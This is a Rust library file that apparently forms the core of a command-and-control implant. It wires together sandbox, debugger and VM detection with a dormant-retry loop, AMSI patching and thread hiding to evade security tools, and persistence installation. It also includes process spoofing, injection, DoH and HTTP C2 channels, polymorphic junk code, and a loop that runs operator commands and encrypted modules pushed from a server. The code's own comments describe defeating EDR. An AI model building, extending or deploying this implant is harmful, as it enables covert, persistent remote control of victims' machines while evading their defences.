pub mod config;
pub mod env_check;
pub mod fsops;
pub mod handlers;
pub mod process_manager;
pub mod process_spoof;
pub mod shell;

#[cfg(feature = "outbound-c")]
pub mod outbound;

#[cfg(feature = "persistence")]
pub mod persistence;

#[cfg(feature = "network-discovery")]
pub mod net_discovery;

#[cfg(feature = "remote-assist")]
pub mod remote_assist;

#[cfg(feature = "hci-research")]
pub mod hci_logging;

pub mod syscalls;

// Memory-guard: active implementation when feature is on, zero-cost stubs when off.
#[cfg(feature = "memory-guard")]
pub mod memory_guard;
#[cfg(not(feature = "memory-guard"))]
#[path = "memory_guard_stub.rs"]
pub mod memory_guard;

use anyhow::Result;
use common::{config::Config, CryptoSession, Message, Transport};
use log::{error, info};
use std::sync::Arc;
use tokio::sync::Mutex;

pub struct Agent {
    transport: Arc<Mutex<Box<dyn Transport + Send>>>,
    config: Arc<Mutex<Config>>,
    /// AES-256-GCM session used to decrypt capability modules deployed at
    /// runtime. Derived from the `module_signing_key` in `agent.toml`, or
    /// a zero key when not configured (development only).
    crypto: Arc<CryptoSession>,
}

impl Agent {
    pub fn new(transport: Box<dyn Transport + Send>) -> Result<Self> {
        // Evasion patches are applied once in Agent::run() before the main loop.
        // Applying them here as well would create a race: if the memory patch
        // takes effect here but is reverted by EDR before run() installs the
        // hardware-breakpoint layer, neither layer would be active.  A single
        // ordered application in run() is safer.

        let cfg = config::load_config()?;

        // Derive the module-decryption key from configuration.
        // In production this key must be set in agent.toml.
        let crypto_key: [u8; 32] = if let Some(ref b64) = cfg.module_signing_key {
            use base64::Engine;
            let bytes = base64::engine::general_purpose::STANDARD
                .decode(b64)
                .map_err(|e| {
                    anyhow::anyhow!(
                        "module_signing_key in agent.toml is not valid base64: {}. \
                     Provide a valid 32-byte base64-encoded key or remove the field \
                     to disable module signature verification.",
                        e
                    )
                })?;
            if bytes.len() != 32 {
                return Err(anyhow::anyhow!(
                    "module_signing_key must decode to exactly 32 bytes, got {} byte(s). \
                     Re-generate the key with the `keygen` tool.",
                    bytes.len()
                ));
            }
            let mut key = [0u8; 32];
            key.copy_from_slice(&bytes);
            key
        } else {
            // In release builds (no debug_assertions, not dev/test feature) a
            // missing module_signing_key is a hard error: an all-zero key lets
            // anyone push arbitrary modules.  Development builds accept the
            // insecure default so the build cycle stays fast.
            #[cfg(not(any(debug_assertions, feature = "dev", test)))]
            return Err(anyhow::anyhow!(
                "module_signing_key is required in production builds. \
                 Generate a 32-byte key with `keygen`, base64-encode it, \
                 and set it in agent.toml under [module_signing_key]."
            ));

            #[cfg(any(debug_assertions, feature = "dev", test))]
            log::warn!(
                "WARNING: module_signing_key not set — using insecure all-zero key. \
                 Do not use in production!"
            );

            [0u8; 32] // insecure default; acceptable only for development builds
        };

        Ok(Self {
            transport: Arc::new(Mutex::new(transport)),
            config: Arc::new(Mutex::new(cfg)),
            crypto: Arc::new(CryptoSession::from_key(crypto_key)),
        })
    }

    pub async fn run(&mut self) -> Result<()> {
        // Trusted Execution Environment Enforcement runs FIRST, before any
        // side-effectful hooks are applied.  If the environment is hostile
        // (debugger, wrong domain, VM when refuse_in_vm is set) the agent
        // enters a dormant state without having modified any process state.
        #[cfg(feature = "env-validation")]
        {
            let decision = {
                let cfg = self.config.lock().await;
                env_check::enforce(
                    cfg.required_domain.as_deref(),
                    cfg.refuse_when_debugged,
                    cfg.refuse_in_vm,
                    cfg.sandbox_score_threshold,
                )
            };

            if decision.report.ld_preload_set {
                log::warn!("LD_PRELOAD is set in the environment (soft warning)");
            }
            if decision.report.timing_anomaly_detected {
                log::warn!("Timing anomaly detected (soft warning, possibly high load)");
            }

            if decision.refuse {
                error!(
                    "environment validation failed (debugger={}, vm={}, domain_match={:?}); agent entering dormant state",
                    decision.report.debugger_present,
                    decision.report.vm_detected,
                    decision.report.domain_match,
                );
                const RECHECK_INTERVAL_SECS: u64 = 2 * 3600;
                const MAX_RETRIES: u32 = 3;
                let mut retries = 0u32;
                loop {
                    if let Err(e) = crate::memory_guard::guarded_sleep(
                        std::time::Duration::from_secs(RECHECK_INTERVAL_SECS),
                        None,
                    )
                    .await
                    {
                        error!("[memory-guard] error during dormant sleep: {e}");
                    }
                    let recheck = {
                        let cfg = self.config.lock().await;
                        env_check::enforce(
                            cfg.required_domain.as_deref(),
                            cfg.refuse_when_debugged,
                            cfg.refuse_in_vm,
                            cfg.sandbox_score_threshold,
                        )
                    };
                    if !recheck.refuse {
                        info!("environment re-check passed; resuming normal operation");
                        break;
                    }
                    retries += 1;
                    if retries >= MAX_RETRIES {
                        error!("maximum dormant retries ({}) reached; returning error so reconnect loop retries", MAX_RETRIES);
                        return Err(anyhow::anyhow!(
                            "Environment check failed permanently after {} retries",
                            MAX_RETRIES
                        ));
                    }
                    error!(
                        "environment re-check failed ({}/{}); remaining dormant",
                        retries, MAX_RETRIES
                    );
                }
            } else {
                info!(
                    "environment validation passed (debugger={}, vm={}, domain_match={:?})",
                    decision.report.debugger_present,
                    decision.report.vm_detected,
                    decision.report.domain_match,
                );
            }
        }

        // Evasion layers are applied AFTER environment validation succeeds.
        // Applying them before validation would produce side-effects (AMSI
        // patches, thread hiding) even on hostile hosts where the agent should
        // refuse to run.
        #[cfg(feature = "stealth")]
        {
            log::debug!("Applying evasion layers");
            unsafe {
                crate::evasion::patch_amsi();
            }
            crate::amsi_defense::orchestrate_layers();
            crate::amsi_defense::verify_bypass();
            crate::evasion::hide_current_thread();
            log::debug!("Evasion layers applied");
        }

        // Optimize hot functions at startup
        #[cfg(feature = "unsafe-runtime-rewrite")]
        if let Err(e) = optimizer::optimize_hot_function("crypto_session_encrypt") {
            tracing::warn!("Runtime optimization failed: {}", e);
        }

        // Honour opt-in persistence (Prompt H).
        #[cfg(feature = "persistence")]
        {
            let cfg = self.config.lock().await;
            if cfg.persistence_enabled {
                match persistence::install_persistence() {
                    Ok(p) => info!("Persistence installed at {}", p.display()),
                    Err(e) => error!("Failed to install persistence: {e}"),
                }
            }
        }

        info!("Agent started, waiting for commands...");
        let mut tasks = tokio::task::JoinSet::new();

        loop {
            let msg_fut = async {
                let mut transport = self.transport.lock().await;
                transport.recv().await
            };

            let msg = tokio::select! {
                res = msg_fut => res,
                _ = crate::handlers::SHUTDOWN_NOTIFY.notified() => {
                    info!("Shutdown signal received, draining tasks and shutting down.");
                    break;
                }
            };

            match msg {
                Ok(Message::TaskRequest {
                    task_id,
                    command,
                    operator_id,
                }) => {
                    info!("Received command: {:?}", command);
                    let crypto = self.crypto.clone();
                    let config = self.config.clone();
                    let transport = self.transport.clone();
                    tasks.spawn(async move {
                        let (response, audit_event) = handlers::handle_command(
                            crypto,
                            config,
                            command,
                            operator_id.as_deref().unwrap_or("admin"),
                        )
                        .await;
                        let mut t = transport.lock().await;
                        if let Err(e) = t.send(Message::AuditLog(audit_event)).await {
                            error!("Failed to send audit log: {}", e);
                        }
                        if let Err(e) = t
                            .send(Message::TaskResponse {
                                task_id,
                                result: response,
                            })
                            .await
                        {
                            error!("Failed to send response: {}", e);
                        }
                    });
                }
                Ok(Message::Shutdown) => {
                    info!("Shutdown received, exiting.");
                    break;
                }
                Ok(Message::ModulePush {
                    module_name,
                    version,
                    encrypted_blob,
                }) => {
                    info!(
                        "ModulePush received: module='{}' version='{}'",
                        module_name, version
                    );
                    let crypto = self.crypto.clone();
                    let transport = self.transport.clone();
                    let name_clone = module_name.clone();
                    let ver_clone = version.clone();
                    tasks.spawn(async move {
                        let result =
                            handlers::push_module(name_clone.clone(), &encrypted_blob, &crypto);
                        let (outcome, details) = match &result {
                            Ok(s) => {
                                info!("ModulePush '{}': {}", name_clone, s);
                                (common::Outcome::Success, s.as_str().to_owned())
                            }
                            Err(e) => {
                                error!("ModulePush '{}' failed: {}", name_clone, e);
                                (common::Outcome::Failure, e.as_str().to_owned())
                            }
                        };
                        let action =
                            format!("ModulePush(module={name_clone:?},version={ver_clone:?})");
                        let audit = handlers::make_audit(&action, outcome, &details, "server");
                        let mut t = transport.lock().await;
                        if let Err(e) = t.send(Message::AuditLog(audit)).await {
                            error!("Failed to send ModulePush audit log: {}", e);
                        }
                    });
                }
                Ok(_) => {} // ignore heartbeats etc.
                Err(e) => {
                    error!("Transport error: {}", e);
                    // Drain tasks before returning error
                    while let Some(_) = tasks.join_next().await {}
                    return Err(e);
                }
            }
        }

        while let Some(_) = tasks.join_next().await {}
        Ok(())
    }
}

pub mod amsi_defense;
#[cfg(windows)]
pub mod callback_exec;
pub mod evasion;
pub mod stub;

// Inserting some random junk compilation artifacts (FR-2)
pub fn polymorph() {
    junk_macro::insert_junk!();
}
#[cfg(windows)]
pub mod injection;

pub mod obfuscated_sleep;

pub mod c2_doh;
pub mod c2_http;
